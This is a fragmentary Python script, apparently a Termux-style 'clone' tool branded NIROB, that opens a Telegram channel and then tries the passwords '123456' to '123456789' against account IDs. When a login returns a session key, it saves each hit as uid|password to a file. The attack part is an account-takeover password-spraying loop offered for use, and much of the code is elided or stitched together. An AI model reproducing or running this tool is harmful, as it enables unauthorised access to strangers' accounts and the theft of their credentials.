...
os.system('clear')
print(' \x1b[38;5;46mNIROB SPECIAL CLONE SERVER LOADING....')
...
os.system('clear')
os.system('xdg-open https://t.me/instagramkop')
os.system('xdg-open https://t.me/instagramkop')

import os, sys

# Tomar Telegram channel link
channel_link = "https://t.me/instagramkop"
...
def first_step():
    ...
    print("\033[1;32m KEY TELEGRM CHANNEL E PEYE JABEN ✅ \033[0m\n")
    print("[!] Age Telegram Channel Join Koro.")
    print(f"[+] Channel Link: {channel_link}\n")

    # Yeh direct WhatsApp channel open karega
    os.system(f"xdg-open {channel_link}")

    input("\n[↩] Channel Subscribe/Join Korar Pore Enter E Click Koro...")
...
sys.stdout.write('\x1b]2;𓆩【R.A.J.A 👑 】𓆪 \x07')
    ...
    # NIROB Clover Logo - Green - Version 2.5
def ____banner____():
    ...
    try:
        ...
        for pw in ('123456', '1234567', '12345678', '123456789'):
            ...
            if 'session_key' in res:
                ...
                print(f"\r\r\x1b[1;37m\x1b[38;5;196m\x1b[1;37m\x1b[38;5;196m(\x1b[1;37mNIROB\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                open('/sdcard/NIROB-OLD-M1-OK.txt', 'a').write(f"{uid}|{pw}\n")
                oks.append(uid)
                break
        loop += 1
